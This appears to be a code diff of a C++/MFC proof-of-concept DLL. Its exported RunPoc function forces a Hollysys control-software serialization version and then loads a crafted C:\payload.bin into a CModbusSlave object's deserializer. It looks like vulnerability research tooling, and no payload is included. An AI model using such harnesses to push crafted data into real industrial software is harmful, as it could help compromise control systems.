@@ -1,94 +1,87 @@
 #include <afx.h>
 #include <afxwin.h>
 
-static bool TrySerialize(CObject* obj, CArchive* ar) {
-    if (!obj || !ar) {
-        return false;
-    }
-    __try {
-        obj->Serialize(*ar);
-        return true;
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        return false;
-    }
-}
+// 声明外部函数 (在 AppData.dll / EXE 中)
+// 如果链接报错，可以先把 SetSerilizeVersion 注释掉，只看 Get
+// 但通常 Hollysys 的导出库里有这个
+extern "C" void __stdcall SetSerilizeVersion(unsigned long ver);
+extern "C" unsigned long __stdcall GetSerilizeVersion();
 
-// 存根类
 class CModbusSlave : public CObject {
 public:
     virtual void Serialize(CArchive& ar);
-    
-    // 我们需要声明这个静态函数才能调用它
-    static CRuntimeClass* PASCAL GetThisClass(); 
+    static CRuntimeClass* PASCAL GetThisClass();
 };
-
-// 这里的符号名必须与 DLL 导出完全一致
-// 在 IDA 中确认: ?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ
-// 如果链接报错，可能需要改为动态获取地址 (见下文)
 
 extern "C" __declspec(dllexport) void RunPoc() {
     AFX_MANAGE_STATE(AfxGetStaticModuleState());
 
-    // =========================================================
-    // 步骤 1: 动态获取 CModbusSlave::GetThisClass 函数地址
-    // =========================================================
-    HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
-    if (!hLogic) {
-        ::MessageBox(NULL, _T("dllDPLogic.dll not loaded"), _T("Error"), MB_OK);
-        return;
+    // 1. 强制版本对齐 (关键!)
+    // 我们必须确保 Load 时的环境与 Dump 时的环境一致 (0x26)
+    // 如果找不到符号，可用 GetProcAddress 动态获取，或者先忽略
+    HMODULE hApp = GetModuleHandle(NULL); // 或者 AppData.dll
+    typedef void (WINAPI *FnSetVer)(unsigned long);
+    typedef unsigned long (WINAPI *FnGetVer)();
+    
+    // 尝试动态获取 (更稳健)
+    FnSetVer pSetVer = (FnSetVer)GetProcAddress(hApp, "?SetSerilizeVersion@CAppGlobalFunc@@SGXK@Z");
+    FnGetVer pGetVer = (FnGetVer)GetProcAddress(hApp, "?GetSerilizeVersion@CAppGlobalFunc@@SGKXZ");
+    
+    // 如果找不到导出名，尝试硬编码搜到的地址，或者跳过
+    if (pSetVer && pGetVer) {
+        unsigned long oldVer = pGetVer();
+        if (oldVer != 0x26) {
+            CString msg;
+            msg.Format(_T("Current Version: 0x%X. Forcing to 0x26."), oldVer);
+            ::MessageBox(NULL, msg, _T("Version Fix"), MB_OK);
+            pSetVer(0x26);
+        }
     }
 
-    // 这一步很关键：我们需要拿到 RuntimeClass 才能创建对象
-    // 这个 mangled name 是标准的 MSVC name，你可以用 Dependency Walker 确认
-    typedef CRuntimeClass* (*FnGetClass)();
-    FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
-
-    if (!pfnGetClass) {
-        // 如果找不到导出，尝试 Plan B: 也许它是 CModbusSlave::classCModbusSlave 静态变量
-        ::MessageBox(NULL, _T("Cannot find GetThisClass! Is it exported?"), _T("Error"), MB_OK);
-        // 如果这里失败了，告诉我，我们需要换个方式拿 Class
-        return;
-    }
-
-    // =========================================================
-    // 步骤 2: 创建对象
-    // =========================================================
-    CRuntimeClass* pClass = pfnGetClass();
-    if (!pClass) {
-        ::MessageBox(NULL, _T("GetThisClass returned NULL"), _T("Error"), MB_OK);
-        return;
-    }
-
-    CObject* pObj = pClass->CreateObject();
-    if (!pObj) {
-        ::MessageBox(NULL, _T("CreateObject failed"), _T("Error"), MB_OK);
-        return;
-    }
-
-    // =========================================================
-    // 步骤 3: 导出空对象
-    // =========================================================
-    const TCHAR* filename = _T("C:\\empty_slave.bin");
+    // 2. 读取 payload.bin
     CFile f;
-    if (!f.Open(filename, CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)) {
-        ::MessageBox(NULL, _T("Cannot create file"), _T("Error"), MB_OK);
+    CFileException e;
+    if (!f.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary, &e)) {
+        ::MessageBox(NULL, _T("Payload not found"), _T("Error"), MB_OK);
         return;
     }
-
-    CArchive ar(&f, CArchive::store);
-    bool bSuccess = TrySerialize(pObj, &ar);
-    if (!bSuccess) {
-        ::MessageBox(NULL, _T("Crash inside Serialize (Access Violation)"), _T("Dump Failed"), MB_OK | MB_ICONERROR);
-    }
-
-    ar.Close();
+    
+    ULONGLONG totalLen = f.GetLength();
+    int len = (int)totalLen;
+    char* buf = new char[len];
+    f.Read(buf, len);
     f.Close();
 
-    // 清理内存
-    delete pObj;
+    CMemFile memFile((BYTE*)buf, len);
+    CArchive ar(&memFile, CArchive::load);
 
-    if (bSuccess) {
-        ::MessageBox(NULL, _T("✅ EMPTY DUMP SUCCESS!\nFile: C:\\empty_slave.bin"), _T("Victory"), MB_OK);
+    // 3. 创建对象
+    HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
+    typedef CRuntimeClass* (*FnGetClass)();
+    FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
+    if (!pfnGetClass) { ::MessageBox(NULL, _T("No GetClass"), _T("Err"), MB_OK); return; }
+    
+    CObject* pObj = pfnGetClass()->CreateObject();
+
+    // 4. 带诊断的 Load
+    try {
+        pObj->Serialize(ar);
+        ::MessageBox(NULL, _T("✅ LOAD SUCCESS!"), _T("Victory"), MB_OK);
     }
+    catch (CArchiveException* e) {
+        ULONGLONG pos = memFile.GetPosition();
+        
+        CString err;
+        err.Format(_T("LOAD FAILED (EOF)\n\nCause: %d\nRead Position: %llu / %llu\nMissing Bytes: %llu"), 
+            e->m_cause, pos, totalLen, (pos > totalLen ? pos - totalLen : 0));
+        
+        ::MessageBox(NULL, err, _T("Debug Info"), MB_OK | MB_ICONERROR);
+        e->Delete();
+    }
+    catch (...) {
+        ::MessageBox(NULL, _T("Unknown Crash"), _T("Fatal"), MB_OK);
+    }
+
+    delete pObj;
+    delete[] buf;
 }
